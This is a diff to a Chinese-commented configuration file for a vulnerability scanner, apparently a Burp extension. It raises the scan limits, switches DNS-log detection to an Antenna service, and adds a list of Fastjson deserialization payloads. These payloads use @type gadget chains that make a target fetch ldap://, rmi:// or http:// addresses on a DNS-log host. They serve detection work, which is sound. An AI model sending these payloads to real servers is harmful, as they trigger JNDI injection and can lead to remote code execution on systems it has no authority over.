@@ -15,7 +15,7 @@ scan:
   # 表示可以接收同一个站点多少个问题个数
   # 超过次数以后就不在对该站点进行扫描了
   # 0 表示无限次接收
-  issueNumber: 1
+  issueNumber: 0
   # 站点扫描次数
   # 超过次数以后就不在对该站点进行扫描了
   # 0 表示无限次扫描
@@ -184,7 +184,7 @@ application:
   cmdEchoExtension:
     config:
       isStart: true
-      maxExecutionTime: 10
+      maxExecutionTime: 50
       # 提供商
       # 声明使用 Application.CmdEchoExtension.ExtensionMethod 的哪个类,为该扩展提供服务
       provider: "CmdEchoScan"
@@ -210,7 +210,7 @@ application:
       # 程序最大执行时间
       # 指的是请求里面每个参数的基础最大执行时间
       # 实际上会根据poc的增加而增加
-      maxExecutionTime: 20
+      maxExecutionTime: 50
       # 提供商
       # 声明使用 Application.RemoteCmdExtension.ExtensionMethod 的哪个类,为该扩展提供服务
       provider: "RemoteCmdScan"
@@ -229,6 +229,21 @@ application:
         - "{\"abc\": {\"@type\": \"java.lang.AutoCloseable\"{\"@type\": \"org.apache.xbean.propertyeditor.PropertyEditorRegistry\",\"registry\":{{\"a\": 1}: {\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"rmi://dnslog-url/Exploit\"}}}}}"
         - "{\"abc\": {\"@type\": \"java.lang.AutoCloseable\"{\"@type\": \"org.apache.xbean.propertyeditor.PropertyEditorRegistry\",\"registry\":{{\"a\": 1}: {\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://dnslog-url/Exploit\"}}}}}"
         - "{\"@type\":\"org.springframework.jdbc.support.SQLErrorCodeSQLExceptionTranslator\",\"datasource\":{\"@type\":\"org.springframework.jdbc.datasource.DriverManagerDataSource\",\"url\":\"jdbc:postgresql:!\"dnslog-url:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http:!\"dnslog-url:3306/1.xml\",\"username\":\"aaa\",\"password\":\"aaa\"}}"
+        - "[{\"\\x40type\":\"java.lang.Class\",\"val\":\"java.io.ByteArrayOutputStream\"},{\"\\x40type\":\"java.io.ByteArrayOutputStream\"},{\"\\x40type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"fj48_.flgv6x.dnslog-url\"}}]"
+        - "{\"a\": {\"\\x40type\": \"java.lang.AutoCloseable\",\"\\x40type\": \"com.alibaba.fastjson.JSONReader\",\"reader\": {\"\\x40type\": \"jdk.nashorn.api.scripting.URLReader\",\"url\": \"http://fj68.flgv6x.dnslog.cn\"}}}"
+        - "{\"\\x40type\":\"java.lang.Exception\",\"\\x40type\":\"com.alibaba.fastjson.JSONException\",\"x\":{\"\\x40type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"fj80.dnslog-url\"}}}"
+        - "[{\"\\x40type\":\"java.lang.Exception\",\"\\x40type\":\"com.alibaba.fastjson.JSONException\",\"x\":{\"\\x40type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"fj80-1.dnslog-url\"}}},{\"\\x40type\":\"java.lang.Exception\",\"\\x40type\":\"com.alibaba.fastjson.JSONException\",\"message\":{\"\\x40type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"fj80-2.dnslog-url\"}}}]"
+        - "{\"\\x40type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":\"{\"data_source\":\"ldap://dnslog-url/cssoit\"}}"
+        - "{\"\\x40type\":\"com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://dnslog-url/css\"}"
+        - "{\"\\x40type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"ldap://dnslog-url/css\",\"Object\":\"a\"}"
+        - "{\"\\x40type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://dnslog-url/css\"}"
+        - "{\"@type\":\"org.apache.cocoon.components.slide.impl.JMSContentInterceptor\", \"parameters\": {\"@type\":\"java.util.Hashtable\",\"java.naming.factory.initial\":\"com.sun.jndi.rmi.registry.RegistryContextFactory\",\"topic-factory\":\"ldap://dnslog-url/Calc\"}, \"namespace\":\"\"}"
+        - "{\"\\x40type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://dnslog-url/css\"}"
+        - "{\"\\x40type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://dnslog-url/css\"], \"Realms\":[\"\"]}"
+        - "{\"\\x40type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://dnslog-url/css\"}"
+        - "{%0d%0a \"\\x40type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",%0d%0a\"properties\":{%0d%0a\"@type\":\"java.util.Properties\",%0d%0a \"UserTransaction\":\"rmi://dnslog-url/css\"%0d%0a }%0d%0a}"
+
+
 # dnsLog模块
 dnsLogModule:
   # 提供商
@@ -237,7 +252,12 @@ dnsLogModule:
   # DnsLogCn = http://dnslog.cn的接口
   # BurpDnsLog = burp自带的dnslog接口
   # Ceye = http://ceye.io的接口
-  provider: "DnsLogCn"
+  # 增加Antenna支持,需要修改成自己搭建的地址
+  # Antenna
+  provider: "Antenna"
+  antenna_platform: "http://antenna.cool/"                # Antenna 平台地址，用于API查询
+  antenna_apikey: "用户API_Key"                           # Antenna 用户API_Key
+  antenna_identifier: "dnslog.antenna.cool"              # Antenna 的DNS组件监听地址
   # 其它数据,用于一些需要验证接口取值使用的
   # 注意: key=value;为一个参数
   # 例如:
